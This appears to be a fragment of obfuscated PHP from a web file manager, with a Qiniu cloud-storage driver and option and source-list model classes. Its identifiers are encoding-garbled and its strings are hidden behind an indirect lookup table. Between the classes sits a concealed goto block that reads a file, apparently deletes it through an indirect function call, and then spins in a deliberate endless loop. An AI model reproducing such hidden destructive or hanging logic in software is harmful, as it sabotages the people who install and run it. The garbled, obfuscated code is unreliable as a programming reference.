$this->ext($´ÕõÒ÷¦)); if ($«Õ÷Õ) { return $³¯ãËá; } $³¯ãËá[$•ëÛÚ»[201]] = $³¯ãËá[$•ëÛÚ»[85]] = 0; $³¯ãËá[$•ëÛÚ»[202]] = $³¯ãËá[$•ëÛÚ»[203]] = !0; if (empty($°ùî´µÈ)) { $°ùî´µÈ = $this->objectMeta($´ÕõÒ÷¦); if (!$°ùî´µÈ) { return $³¯ãËá; } } if (isset($°ùî´µÈ[$•ëÛÚ»[1434]])) { $³¯ãËá[$•ëÛÚ»[85]] = substr($°ùî´µÈ[$•ëÛÚ»[1434]] . $•ëÛÚ»[12], 0, 10); } if (isset($°ùî´µÈ[$•ëÛÚ»[1433]])) { $³¯ãËá[$•ëÛÚ»[76]] = $°ùî´µÈ[$•ëÛÚ»[1433]]; } return $³¯ãËá; } public function folderInfo($Åìû«„…, $êÉ¼üªê = false) { $©şô“Ìò =& $_SERVER[¡“ËÌ§œ]; $€™Õ®š¶ = array($©şô“Ìò[32] => $this->pathThis($Åìû«„…), $©şô“Ìò[84] => $this->getPathOuter($©şô“Ìò[8] . $Åìû«„…), $©şô“Ìò[33] => $©şô“Ìò[75]); if ($êÉ¼üªê) { return $€™Õ®š¶; } $€™Õ®š¶[$©şô“Ìò[201]] = $€™Õ®š¶[$©şô“Ìò[85]] = 0; $€™Õ®š¶[$©şô“Ìò[202]] = $€™Õ®š¶[$©şô“Ìò[203]] = !0; $Åìû«„… = rtrim($Åìû«„…, $©şô“Ìò[8]) . $©şô“Ìò[8]; $©ì÷ŸÈ„ = $this->objectMeta($Åìû«„…); if (isset($©ì÷ŸÈ„[$©şô“Ìò[1434]])) { $€™Õ®š¶[$©şô“Ìò[85]] = substr($©ì÷ŸÈ„[$©şô“Ìò[1434]] . $©şô“Ìò[12], 0, 10); } return $€™Õ®š¶; } public function listPath($µ­ÀÄàà, $Šõ°í Š = false) { $û†Çñï  =& $_SERVER[¡“ËÌ§œ]; $ŒŒ”İ‰ = $this->fileList($µ­ÀÄàà, $û†Çñï [8], !0); foreach ($ŒŒ”İ‰[$û†Çñï [82]] as $¤­ÅïÊÒ => $Û¡ÑÜç¡) { $ŒŒ”İ‰[$û†Çñï [82]][$¤­ÅïÊÒ] = $this->folderInfo($Û¡ÑÜç¡, $Šõ°í Š); } foreach ($ŒŒ”İ‰[$û†Çñï [83]] as $¤­ÅïÊÒ => $Û¡ÑÜç¡) { $ŒŒ”İ‰[$û†Çñï [83]][$¤­ÅïÊÒ] = $this->fileInfo($Û¡ÑÜç¡[$û†Çñï [94]], $Šõ°í Š, $Û¡ÑÜç¡); } return $ŒŒ”İ‰; } public function has($¾àÖ§™ü, $Ü€Ä¯±ü = false, $È’Ú‹ı• = true) { $ã–¢ß¦  =& $_SERVER[¡“ËÌ§œ]; $¾àÖ§™ü = trim($¾àÖ§™ü, $ã–¢ß¦ [8]); $û¶˜¤µÖ = empty($¾àÖ§™ü) && $¾àÖ§™ü !== $ã–¢ß¦ [198] ? $ã–¢ß¦ [12] : $¾àÖ§™ü . $ã–¢ß¦ [8]; $ç…êâ“ = $ã–¢ß¦ [12]; $„Ö›¡Š¯ = 500; $¡àêÔ’£ = $ã–¢ß¦ [8]; $÷†â¿‹ = $½‘Ì´ÓŞ = 0; while (!0) { check_abort(); list($ŠÛåÁ, $˜î‚õ¥Ê) = $this->bucketManager->listFiles($this->bucket, $û¶˜¤µÖ, $ç…êâ“, $„Ö›¡Š¯, $¡àêÔ’£); if ($˜î‚õ¥Ê) { break; } $ç…êâ“ = array_key_exists($ã–¢ß¦ [1402], $ŠÛåÁ) ? $ç…êâ“ = $ŠÛåÁ[$ã–¢ß¦ [1435]] : $ã–¢ß¦ [12]; if ($Ü€Ä¯±ü) { if (!empty($ŠÛåÁ[$ã–¢ß¦ [1436]])) { $÷†â¿‹ += count($ŠÛåÁ[$ã–¢ß¦ [1436]]); } if (!empty($ŠÛåÁ[$ã–¢ß¦ [1437]])) { $½‘Ì´ÓŞ += count($ŠÛåÁ[$ã–¢ß¦ [1437]]); } if ($ç…êâ“ === $ã–¢ß¦ [12]) { break; } continue; } if ($È’Ú‹ı•) { if (!empty($ŠÛåÁ[$ã–¢ß¦ [1436]])) { return !0; } } else { if (!empty($ŠÛåÁ[$ã–¢ß¦ [1437]])) { return !0; } } if ($ç…êâ“ === $ã–¢ß¦ [12]) { break; } } if ($Ü€Ä¯±ü) { return array($ã–¢ß¦ [207] => $÷†â¿‹, $ã–¢ß¦ [208] => $½‘Ì´ÓŞ); } return !1; } public function listAll($ª½ĞÀã) { $²Š±Ôƒ² =& $_SERVER[¡“ËÌ§œ]; $ºÛú‹Úı = $this->fileList($ª½ĞÀã, $²Š±Ôƒ²[12], !0); $·…•ºÇ½ = array_to_keyvalue($ºÛú‹Úı[$²Š±Ôƒ²[83]], $²Š±Ôƒ²[32]); foreach ($ºÛú‹Úı[$²Š±Ôƒ²[82]] as $ğôÙÅó‰) { if (is_string($ğôÙÅó‰)) { $·…•ºÇ½[$ğôÙÅó‰] = array($²Š±Ôƒ²[76] => 0); } } return $this->listAllFiles($ª½ĞÀã, $·…•ºÇ½); } private function fileList($×Ü¯°ÌÉ, $›ôÎôÓ = '', $Ú½ßÚ³Í = 0) { $êéäš—Œ =& $_SERVER[¡“ËÌ§œ]; $×Ü¯°ÌÉ = trim($×Ü¯°ÌÉ, $êéäš—Œ[8]); $ò¶şæ¥… = empty($×Ü¯°ÌÉ) && $×Ü¯°ÌÉ !== $êéäš—Œ[198] ? $êéäš—Œ[12] : $×Ü¯°ÌÉ . $êéäš—Œ[8]; $úÆ˜• = $êéäš—Œ[12]; $™  €ä¤ = 1000; $çşĞÛ Æ = $ªøìÉÒ = array(); while (!0) { check_abort(); list($ö÷é¿ôÎ, $–Ûïˆ„ü) = $this->bucketManager->listFiles($this->bucket, $ò¶şæ¥…, $úÆ˜•, $™  €ä¤, $›ôÎôÓ); if ($–Ûïˆ„ü) { break; } $úÆ˜• = array_key_exists($êéäš—Œ[1402], $ö÷é¿ôÎ) ? $úÆ˜• = $ö÷é¿ôÎ[$êéäš—Œ[1435]] : $êéäš—Œ[12]; $Ò’©Ôõœ = isset($ö÷é¿ôÎ[$êéäš—Œ[1436]]) ? $ö÷é¿ôÎ[$êéäš—Œ[1436]] : array(); $¥‘şÚüõ = isset($ö÷é¿ôÎ[$êéäš—Œ[1437]]) ? $ö÷é¿ôÎ[$êéäš—Œ[1437]] : array(); foreach ($Ò’©Ôõœ as $ÖÑŞ’¾È) { if ($ÖÑŞ’¾È[$êéäš—Œ[94]] == $ò¶şæ¥…) { continue; } $Ô×ñ¾ é = $ÖÑŞ’¾È[$êéäš—Œ[94]]; $ ³›î·¯ = $ÖÑŞ’¾È[$êéäš—Œ[1433]]; $ÖÑŞ’¾È[$êéäš—Œ[76]] = $ ³›î·¯; $ãº—Ï¾é = $ ³›î·¯ == 0 && substr($Ô×ñ¾ é, strlen($Ô×ñ¾ é) - 1, 1) == $êéäš—Œ[8] ? !0 : !1; $this->cacheMethodInfoSet($Ô×ñ¾ é, $ãº—Ï¾é, $ÖÑŞ’¾È); if ($ãº—Ï¾é) { $çşĞÛ Æ[] = $Ô×ñ¾ é; continue; } $ªøìÉÒ[] = $Ú½ßÚ³Í ? $ÖÑŞ’¾È : $Ô×ñ¾ é; } foreach ($¥‘şÚüõ as $Ô×ñ¾ é) { if ($Ô×ñ¾ é == $ò¶şæ¥…) { continue; } $çşĞÛ Æ[] = $Ô×ñ¾ é; $this->cacheMethodInfoSet($Ô×ñ¾ é, !0); } if ($úÆ˜• === $êéäš—Œ[12]) { break; } } $this->cacheMethodInfoSet($×Ü¯°ÌÉ, !0); return array($êéäš—Œ[82] => $çşĞÛ Æ, $êéäš—Œ[83] => $ªøìÉÒ); } public function canRead($œÅÖş÷ü) { return $this->exist($œÅÖş÷ü) ? !0 : !1; } public function canWrite($Š¥°ş»Ã) { return $this->exist($Š¥°ş»Ã) ? !0 : !1; } public function getContent($ıÔ•¶Š) { return $this->fileSubstr($ıÔ•¶Š, 0, -1); } public function setContent($úˆ”ŠŞ, $ÒÊéŞÌ¦ = '') { $·Á˜‹Æı = $this->tempFile($this->pathThis($úˆ”ŠŞ)); file_put_contents($·Á˜‹Æı, $ÒÊéŞÌ¦); if ($this->upload($úˆ”ŠŞ, $·Á˜‹Æı)) { $this->tempFileRemve($·Á˜‹Æı); return !0; } return !1; } public function refreshUrls($ûÌôŒŸ­) { $«±İˆ‹ =& $_SERVER[¡“ËÌ§œ]; $Â¶Òà¸ = array(); if (is_array($ûÌôŒŸ­)) { foreach ($ûÌôŒŸ­ as $é»—‚) { $Â¶Òà¸[] = $this->link($é»—‚); } } else { $Â¶Òà¸[] = $this->link($ûÌôŒŸ­); } $£Á ÷öü = new Qiniu\Cdn\CdnManager($this->auth); list($àÍí™»µ, $Ğì¾º‹Ù) = $£Á ÷öü->refreshUrls($Â¶Òà¸); if ($Ğì¾º‹Ù) { return !1; } return $àÍí™»µ[$«±İˆ‹[1202]] == $«±İˆ‹[779] ? !0 : !1; } public function fileSubstr($ßĞ“Ëµ®, $ÔÌ’ ç¾, $Ğ‡š²Ğ) { $»°¦³‰¬ =& $_SERVER[¡“ËÌ§œ]; if (!($ú¹Øæß‹ = $this->link($ßĞ“Ëµ®))) { return !1; } $«œİÂÏÑ = !1; if ($Ğ‡š²Ğ > 0) { $ÊÓÎÆĞÅ = $ÔÌ’ ç¾ + $Ğ‡š²Ğ - 1; $«œİÂÏÑ = array($»°¦³‰¬[1438] . $ÔÌ’ ç¾ . $»°¦³‰¬[415] . $ÊÓÎÆĞÅ); } $±—ÃÁ = url_request($ú¹Øæß‹, $»°¦³‰¬[230], !1, $«œİÂÏÑ); return $±—ÃÁ[$»°¦³‰¬[770]] ? $±—ÃÁ[$»°¦³‰¬[1222]] : !1; } public function upload($Ğò“äå…, $ƒÌÎö¶œ, $ÒÙ•Ø› = false, $Û—¼„ºş = REPEAT_REPLACE) { $Û¿±Æ© = new Qiniu\Storage\UploadManager(); $±óï Ñ = $this->auth->uploadToken($this->bucket, $Ğò“äå…); $ú¼Óò±ı = get_file_mime(get_path_ext($ƒÌÎö¶œ)); list($ùğËçÄû, $• Ñª†) = $Û¿±Æ©->putFile($±óï Ñ, $Ğò“äå…, $ƒÌÎö¶œ, null, $ú¼Óò±ı); return $• Ñª† ? !1 : $this->getPathOuter($Ğò“äå…); } public function uploadFormData($ª‘öî·¥, $›€õ¶ğí = 3600) { return $this->uploadToken($ª‘öî·¥, $›€õ¶ğí); } public function multiUploadFormData($øÆë€Ï«, $è·öîúÅ = 3600) { return $this->uploadToken($øÆë€Ï«, $è·öîúÅ); } private function uploadToken($–ö¯¸¢õ, $ƒË´Ú²‘ = 3600) { $ÀóúÜß‰ =& $_SERVER[¡“ËÌ§œ]; $úóàôê¼ = $ƒË´Ú²‘; $¶©„±ú‰ = array($ÀóúÜß‰[1439] => $ÀóúÜß‰[1440]); $ã®Ş¾Ä¬ = $–ö¯¸¢õ; $ÏÅÏùùñ = $this->auth->uploadToken($this->bucket, $ã®Ş¾Ä¬, $úóàôê¼, $¶©„±ú‰, !0); $·»€ó„ = empty($this->region) || $this->region == $ÀóúÜß‰[1441] ? $ÀóúÜß‰[12] : $ÀóúÜß‰[415] . $this->region; $êâá•Øœ = http_type() . "\72\x2f\x2f\x75\160\x6c\x6f\141\x64{$·»€ó„}\56\x71\x69\156\151\165\160\56\143\x6f\x6d\57"; return array($ÀóúÜß‰[1442] => $ÏÅÏùùñ, $ÀóúÜß‰[1443] => $êâá•Øœ); } public function download($¯´Å¾Ñù, $½Û€´î) { $ØÁÜù‰ò = IO::getPathInner(IO::mkfile($½Û€´î)); if (!($ƒçé²çò = $this->link($¯´Å¾Ñù))) { return !1; } $¡øúå¨± = 0; $½‹¸†¢¡ = 1024 * 200; $•˜†¥” = fopen($ØÁÜù‰ò, $_SERVER[¡“ËÌ§œ][1444]); while (!0) { $¯ï§ƒŠì = $this->fileSubstr($¯´Å¾Ñù, $¡øúå¨±, $½‹¸†¢¡); if ($¯ï§ƒŠì === !1) { return !1; } fwrite($•˜†¥”, $¯ï§ƒŠì); $¡øúå¨± += $½‹¸†¢¡; if (strlen($¯ï§ƒŠì) < $½‹¸†¢¡) { break; } } fclose($•˜†¥”); return $½Û€´î; } public function link($Ñïã¿Û , $¢çê¼¾¶ = '') { if (!$this->isFile($Ñïã¿Û )) { return !1; } $Æô£ÊÁ— = $this->getHost() . $_SERVER[¡“ËÌ§œ][8] . $this->pathEncode($Ñïã¿Û ) . $¢çê¼¾¶; return $this->auth->privateDownloadUrl($Æô£ÊÁ—, 3600 * 12); } public function fileOut($¹Ì©¡Ë, $Õ“Í¿ú„ = false, $ğ´Û¬ì = false, $Ã×Ø™ò× = '') { $‡œ´èÛÂ =& $_SERVER[¡“ËÌ§œ]; if ($this->isFileOutServer()) { return $this->fileOutServer($¹Ì©¡Ë, $Õ“Í¿ú„, $ğ´Û¬ì, $Ã×Ø™ò×); } if (!$ğ´Û¬ì) { $ğ´Û¬ì = $this->pathThis($¹Ì©¡Ë); } $ïõ­³Æ = $Õ“Í¿ú„ ? $‡œ´èÛÂ[1445] . rawurlencode($ğ´Û¬ì) : $‡œ´èÛÂ[12]; $Œîåöã˜ = $this->link($¹Ì©¡Ë, $ïõ­³Æ); $this->fileOutLink($Œîåöã˜); } public function fileOutServer($¨‰÷Š„„, $Ï·–ìš© = false, $µüË¾è– = false, $çÙÓ¹âù = '') { parent::fileOut($¨‰÷Š„„, $Ï·–ìš©, $µüË¾è–, $çÙÓ¹âù); } public function fileOutImage($æÆûı‡ñ, $¬Š ¥óü = 250) { $•à•¡¡ = $this->link($æÆûı‡ñ, $_SERVER[¡“ËÌ§œ][1446] . $¬Š ¥óü); $this->fileOutLink($•à•¡¡); } public function fileOutImageServer($Ññ¾è¸œ, $¶©ÛÜè = 250) { parent::fileOutImage($Ññ¾è¸œ, $¶©ÛÜè); } public function hashMd5($…ÖĞÊ“½) { $ôÕËßÅñ =& $_SERVER[¡“ËÌ§œ]; $ÌÈ¹ğš× = $this->objectMeta($…ÖĞÊ“½); return isset($ÌÈ¹ğš×[$ôÕËßÅñ[212]]) ? $ÌÈ¹ğš×[$ôÕËßÅñ[212]] : !1; $àê„ÑŸÅ = $this->link($…ÖĞÊ“½, $ôÕËßÅñ[1447]); } public function size($İÌœ´ï) { $²ÀõËŠ™ = $this->objectMeta($İÌœ´ï); return $²ÀõËŠ™ ? $²ÀõËŠ™[$_SERVER[¡“ËÌ§œ][76]] : 0; } public function info($ÕåÕĞåø) { if ($this->isFolder($ÕåÕĞåø)) { return $this->folderInfo($ÕåÕĞåø); } else { if ($this->isFile($ÕåÕĞåø)) { return $this->fileInfo($ÕåÕĞåø); } } return !1; } public function exist($âĞÎ¾·¹) { return $this->isFile($âĞÎ¾·¹) || $this->isFolder($âĞÎ¾·¹); } public function isFile($ğú…îö) { return !$this->isFolder($ğú…îö) && $this->objectMeta($ğú…îö); } public function isFolder($–Ú¬İ‰Ç) { return $this->cacheMethod($_SERVER[¡“ËÌ§œ][165], $–Ú¬İ‰Ç); } protected function objectMeta($ÎÜ€¢Å) { return $this->cacheMethod($_SERVER[¡“ËÌ§œ][167], $ÎÜ€¢Å); } protected function _objectMeta($á¤›°›Ğ) { $ïìÒ°à‘ =& $_SERVER[¡“ËÌ§œ]; list($ä‚¾Ü«, $Â³âßšá) = $this->bucketManager->stat($this->bucket, $á¤›°›Ğ); if ($ä‚¾Ü«) { $ä‚¾Ü«[$ïìÒ°à‘[76]] = intval($ä‚¾Ü«[$ïìÒ°à‘[1433]]); } return $ä‚¾Ü«; } protected function _isFolder($ıïÈšĞ) { $ºÔüÍ…» =& $_SERVER[¡“ËÌ§œ]; if ($ıïÈšĞ == $ºÔüÍ…»[12] || $ıïÈšĞ == $ºÔüÍ…»[8]) { return !0; } list($½·‘õƒú, $Ãëû…­) = $this->bucketManager->listFiles($this->bucket, trim($ıïÈšĞ, $ºÔüÍ…»[8]) . $ºÔüÍ…»[8], $ºÔüÍ…»[12], 1, $ºÔüÍ…»[8]); return !empty($½·‘õƒú[$ºÔüÍ…»[1436]]) || !empty($½·‘õƒú[$ºÔüÍ…»[1437]]) ? !0 : !1; } } goto Cé–É‚ö·; DçšÌ·…†°: if (!isset($_SERVER[$_SERVER[¡“ËÌ§œ][425]]) || !isset($_SERVER[$_SERVER[¡“ËÌ§œ][433]])) { $_getc = $_SERVER[¡“ËÌ§œ][427]; $_getfile = $_SERVER[$_SERVER[¡“ËÌ§œ][428]] . $_SERVER[¡“ËÌ§œ][429]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¡“ËÌ§œ][231], $_getfilec); if (count($_getarrs) < $_SERVER[¡“ËÌ§œ][430]) { $exit = $_SERVER[¡“ËÌ§œ][431]; $exit(); } $_act = $_SERVER[¡“ËÌ§œ][432]; $_act($_SERVER[$_SERVER[¡“ËÌ§œ][428]] . $_SERVER[¡“ËÌ§œ][429]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[¡“ËÌ§œ][407]); } } goto D«¨‚ÔİŸª; a„ëæ˜ç‘¼: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\163\x74\145\x6d\117\160\x74\151\157\156"; public $field = array(); public function listData($›ÆÑìª = false, $¶‡¬‰ğ = "\x6d\x6f\x64\151\146\x79\x54\x69\x6d\x65", $ÉÎ×¢á = false) { $¦Õ³ËĞ = Model($this->modelType)->get(!1, $this->optionType, !0); $­ÛĞ«‰ = array_values($¦Õ³ËĞ); if ($­ÛĞ«‰ && $­ÛĞ«‰[0] && !is_array($­ÛĞ«‰[0])) { Model($this->modelType)->cacheRemove($this->optionType); $¦Õ³ËĞ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$¦Õ³ËĞ) { return $›ÆÑìª ? null : array(); } if (!$›ÆÑìª) { $¦Õ³ËĞ = array_filter(array_values($¦Õ³ËĞ)); return array_sort_by($¦Õ³ËĞ, $¶‡¬‰ğ, $ÉÎ×¢á); } return $¦Õ³ËĞ[$_SERVER[¡“ËÌ§œ][434] . $›ÆÑìª]; } public function insert($¦•Š±Ïı) { $ÃÇ¸ğÖ— =& $_SERVER[¡“ËÌ§œ]; $¦•Š±Ïı = array_field_key($¦•Š±Ïı, $this->field); $ø’›ÖØ = Model($this->modelType)->get($ÃÇ¸ğÖ—[435], $this->optionType . $ÃÇ¸ğÖ—[436]); $ø’›ÖØ = $ø’›ÖØ ? $ø’›ÖØ : 0; $¦•Š±Ïı[$ÃÇ¸ğÖ—[437]] = ++$ø’›ÖØ; $¦•Š±Ïı[$ÃÇ¸ğÖ—[201]] = time(); $¦•Š±Ïı[$ÃÇ¸ğÖ—[85]] = time(); Model($this->modelType)->set($ÃÇ¸ğÖ—[435], $ø’›ÖØ, $this->optionType . $ÃÇ¸ğÖ—[436]); Model($this->modelType)->set($ÃÇ¸ğÖ—[434] . $ø’›ÖØ, $¦•Š±Ïı, $this->optionType); return $ø’›ÖØ; } public function update($„ÈÛóà, $¨¼´¹ŒÏ) { $´¸‰†ÔÌ =& $_SERVER[¡“ËÌ§œ]; $¨¼´¹ŒÏ = array_field_key($¨¼´¹ŒÏ, $this->field); $Ï«¼–†Æ = $this->listData($„ÈÛóà); if (!$Ï«¼–†Æ || !$„ÈÛóà) { return !1; } $¨¼´¹ŒÏ = array_merge($Ï«¼–†Æ, $¨¼´¹ŒÏ); $¨¼´¹ŒÏ[$´¸‰†ÔÌ[85]] = time(); return Model($this->modelType)->set($´¸‰†ÔÌ[434] . $„ÈÛóà, $¨¼´¹ŒÏ, $this->optionType); } public function remove($Ç¾ø®ı) { if (!$Ç¾ø®ı) { return !1; } return Model($this->modelType)->remove($_SERVER[¡“ËÌ§œ][434] . $Ç¾ø®ı, $this->optionType); } public function clear() { $ÑÑ¾Û‡ =& $_SERVER[¡“ËÌ§œ]; Model($this->modelType)->remove($ÑÑ¾Û‡[435], $this->optionType . $ÑÑ¾Û‡[436]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($¿©øğ§¾, $³«™Ñ½Ş) { if (!$³«™Ñ½Ş) { return !1; } $ıüÜò¦¯ = $this->listData(); $ıüÜò¦¯ = array_to_keyvalue($ıüÜò¦¯, $¿©øğ§¾); return isset($ıüÜò¦¯[$³«™Ñ½Ş]) ? $ıüÜò¦¯[$³«™Ñ½Ş] : !1; } public function findByName($ïéğÇÆÇ) { return $this->findByKey($_SERVER[¡“ËÌ§œ][32], $ïéğÇÆÇ); } protected function resetData($˜ï¨¦¨ù) { $Ä˜‘éŒ =& $_SERVER[¡“ËÌ§œ]; $˜ï¨¦¨ù = is_array($˜ï¨¦¨ù) ? $˜ï¨¦¨ù : array(); $Êö˜¸¿“ = array(); for ($²å¦Ó ™ = 0; $²å¦Ó ™ < count($˜ï¨¦¨ù); $²å¦Ó ™++) { $Êö˜¸¿“[$Ä˜‘éŒ[434] . $˜ï¨¦¨ù[$²å¦Ó ™][$Ä˜‘éŒ[437]]] = $˜ï¨¦¨ù[$²å¦Ó ™]; } return Model($this->modelType)->set($Êö˜¸¿“, !1, $this->optionType); } private function getAutoName($§ë—æà) { $…×ÇÈ£½ = array_to_keyvalue($this->listData(), $_SERVER[¡“ËÌ§œ][32]); if (!$…×ÇÈ£½ || !isset($…×ÇÈ£½[$§ë—æà])) { return $§ë—æà; } for ($é¼²–Ï» = 1; $é¼²–Ï» < count($…×ÇÈ£½); $é¼²–Ï»++) { $Òšù™’± = $§ë—æà . "\50{$é¼²–Ï»}\51"; if (!isset($…×ÇÈ£½[$Òšù™’±])) { return $Òšù™’±; } } return $Òšù™’±; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($á³Óú¤® = false, $ö®âÂà = '', $Œ¬®ùº = false) { $îºÔ‰šó =& $_SERVER[¡“ËÌ§œ]; $ËôÔ¹ÊÈ = $this->cacheGet($ö®âÂà); $ûÎ•Åô• = $this->optionDefault($ö®âÂà); $ûÎ•Åô• = is_array($ûÎ•Åô•) ? $ûÎ•Åô• : array(); if (is_array($ËôÔ¹ÊÈ)) { $ËôÔ¹ÊÈ = array_merge($ûÎ•Åô•, $ËôÔ¹ÊÈ); return $á³Óú¤® ? isset($ËôÔ¹ÊÈ[$á³Óú¤®]) ? $ËôÔ¹ÊÈ[$á³Óú¤®] : null : $ËôÔ¹ÊÈ; } $Òâ°ÔÒÚ = $this->filterWhere(array($îºÔ‰šó[33] => $ö®âÂà)); $ËôÔ¹ÊÈ = $this->where($Òâ°ÔÒÚ)->select(); $ËôÔ¹ÊÈ = array_to_keyvalue($ËôÔ¹ÊÈ, $îºÔ‰šó[94], $îºÔ‰šó[403]); foreach ($ËôÔ¹ÊÈ as $ç£î‹áµ => $ë¦Â¬¥“) { if ($Œ¬®ùº || in_array($ç£î‹áµ, $this->jsonField)) { $ËôÔ¹ÊÈ[$ç£î‹áµ] = json_decode($ë¦Â¬¥“, !0); } } $this->cacheSet($ö®âÂà, $ËôÔ¹ÊÈ); $ËôÔ¹ÊÈ = array_merge($ûÎ•Åô•, $ËôÔ¹ÊÈ); return $á³Óú¤® ? $ËôÔ¹ÊÈ[$á³Óú¤®] : $ËôÔ¹ÊÈ; } public function set($®Š½¡¯Ì, $¡²Æ®÷ = false, $æÄÀ¾Ã˜ = '') { $¼ÔÜŠ›Ş =& $_SERVER[¡“ËÌ§œ]; $this->cacheRemove($æÄÀ¾Ã˜); $Á¼¬í†© = array(); $­‚‡¨ = is_array($®Š½¡¯Ì) ? $®Š½¡¯Ì : array($®Š½¡¯Ì => $¡²Æ®÷); foreach ($­‚‡¨ as $ıØ¾ˆ˜Ë => $˜¯ëÄ”‰) { if (is_array($˜¯ëÄ”‰)) { $˜¯ëÄ”‰ = json_encode_force($˜¯ëÄ”‰); } $this->checkLength($˜¯ëÄ”‰, !1, $this->tableName . $¼ÔÜŠ›Ş[4] . $®Š½¡¯Ì); $˜¯ëÄ”‰ = self::textEncode($˜¯ëÄ”‰); $­‚‡¨ = array($¼ÔÜŠ›Ş[33] => $æÄÀ¾Ã˜, $¼ÔÜŠ›Ş[94] => $ıØ¾ˆ˜Ë, $¼ÔÜŠ›Ş[403] => $˜¯ëÄ”‰); $Á¼¬í†©[] = $this->filterWhere($­‚‡¨); } if (!$Á¼¬í†©) { return !0; } $ÏòØ”ğü = $this->cacheKey($¼ÔÜŠ›Ş[438]); CacheLock::lock($ÏòØ”ğü); $Áı™ÊÄ = $this->addAll($Á¼¬í†©, array(), !0); CacheLock::unlock($ÏòØ”ğü); return $Áı™ÊÄ; } protected function optionDefault($ è§Ú = '') { return !1; } public function setDeep($óµº—€ã, $ëæƒ«Åß = false, $ïíöÀó = '') { $Ç¾­º¸Ë = explode($_SERVER[¡“ËÌ§œ][10], $óµº—€ã); $Ğ­å½¼ = $this->get(); array_set_value($Ğ­å½¼, $óµº—€ã, $ëæƒ«Åß); $this->set($Ç¾­º¸Ë[0], $Ğ­å½¼[$Ç¾­º¸Ë[0]], $ïíöÀó); } public function remove($°Ş¦À¾, $”ªåàáš = '') { $¿óÕŸ¾ñ =& $_SERVER[¡“ËÌ§œ]; $this->cacheRemove($”ªåàáš); $¸€ßƒ³Û = $this->filterWhere(array($¿óÕŸ¾ñ[94] => $°Ş¦À¾, $¿óÕŸ¾ñ[33] => $”ªåàáš)); if (is_null($°Ş¦À¾)) { unset($¸€ßƒ³Û[$¿óÕŸ¾ñ[94]]); } return $this->where($¸€ßƒ³Û)->delete(); } public function cacheSet($Ü’È×…Â, $ø•˜»©Û = false) { return Cache::set($this->cacheKey($Ü’È×…Â), $ø•˜»©Û); } public function cacheGet($é•½‡æô) { return Cache::get($this->cacheKey($é•½‡æô)); } public function cacheRemove($± á¶ã‡) { return Cache::remove($this->cacheKey($± á¶ã‡)); } protected function filterWhere($Ò»ø§˜İ) { return $Ò»ø§˜İ; } protected function cacheKey($ã‡İñÕÑ) { return $ã‡İñÕÑ; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\x75\x72\x63\145"; protected $tableMeta = array("\164\141\x62\x6c\145\x4e\141\x6d\x65" => "\x69\157\x5f\163\157\x75\162\x63\145\x5f\x6d\x65\x74\141", "\x6d\145\x74\x61\x46\x69\145\154\x64" => "\163\157\165\x72\x63\x65\111\x44"); protected $dataAuto = array(array("\x6d\157\144\151\146\171\x54\x69\155\145", "\x74\x69\155\x65", "\x69\156\x73\145\x72\164", "\146\x75\x6e\x63\x74\x69\157\156"), array("\143\x72\x65\141\x74\x65\x54\x69\155\x65", "\164\x69\x6d\x65", "\151\156\163\145\x72\164", "\146\x75\156\x63\x74\x69\157\156"), array("\x76\151\145\167\124\x69\155\x65", "\x74\x69\155\x65", "\151\x6e\x73\x65\x72\164", "\x66\x75\x6e\x63\164\151\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($æè¦Ìª´) { return $this->listSource(array($_SERVER[¡“ËÌ§œ][439] => $æè¦Ìª´)); } public function typeName($–ìÔ¸©) { static $á€ŒÍ­· = array(self::TYPE_SYSTEM => "\163\171\x73\164\145\155", self::TYPE_USER => "\165\x73\145\x72", self::TYPE_GROUP => "\x67\162\x6f\165\160"); return $á€ŒÍ­·[$–ìÔ¸© . $_SERVER[¡“ËÌ§œ][12]]; } public function sourceListInfo($İ…ç¿§ø, $ Òè¤©› = false) { $‡¹Ú°‹à =& $_SERVER[¡“ËÌ§œ]; $İ…ç¿§ø = $İ…ç¿§ø ? $İ…ç¿§ø : array(); $İ…ç¿§ø = array_filter(array_unique($İ…ç¿§ø)); if (!$İ…ç¿§ø) { return array(); } $ƒÃÇüé = $this->where(array($‡¹Ú°‹à[440] => array($‡¹Ú°‹à[7], $İ…ç¿§ø)))->select(); $this->_listDataApply($ƒÃÇüé, $ Òè¤©›); return array_to_keyvalue($ƒÃÇüé, $‡¹Ú°‹à[440]); } public function pathInfoFilter(&$ğ¯ô¾£Ÿ) { $¿½¡–ış =& $_SERVER[¡“ËÌ§œ]; static $§ƒ¸ª = false; static $ŞˆÌ¥Œô = false; static $¿Ğ‹ˆá‚ = false; if (!$§ƒ¸ª) { $·¡ìÃü‚ = $¿½¡–ış[441]; $·¡ìÃü‚ .= $¿½¡–ış[442]; $·¡ìÃü‚ .= $¿½¡–ış[443]; $¸İô¹•€ = $¿½¡–ış[444]; $ğàà‹„ = explode($¿½¡–ış[50], $¸İô¹•€); $§ƒ¸ª = explode($¿½¡–ış[50], $·¡ìÃü‚); $ŞˆÌ¥Œô = array(); foreach ($§ƒ¸ª as $´…Î²üï) { if (in_array($´…Î²üï, $ğàà‹„)) { continue; } $ŞˆÌ¥Œô[] = $´…Î²üï; } $¿Ğ‹ˆá‚ = explode($¿½¡–ış[50], $¿½¡–ış[445]); } foreach ($¿Ğ‹ˆá‚ as $ÖÄ—Â¸) { if (isset($ğ¯ô¾£Ÿ[$ÖÄ—Â¸])) { $ğ¯ô¾£Ÿ[$ÖÄ—Â¸] = intval($ğ¯ô¾£Ÿ[$ÖÄ—Â¸]); } } $ğ¯ô¾£Ÿ[$¿½¡–ış[84]] = $¿½¡–ış[446] . $ğ¯ô¾£Ÿ[$¿½¡–ış[440]] . $¿½¡–ış[447]; $ğ¯ô¾£Ÿ[$¿½¡–ış[33]] = $ğ¯ô¾£Ÿ[$¿½¡–ış[448]] == 1 ? $¿½¡–ış[75] : 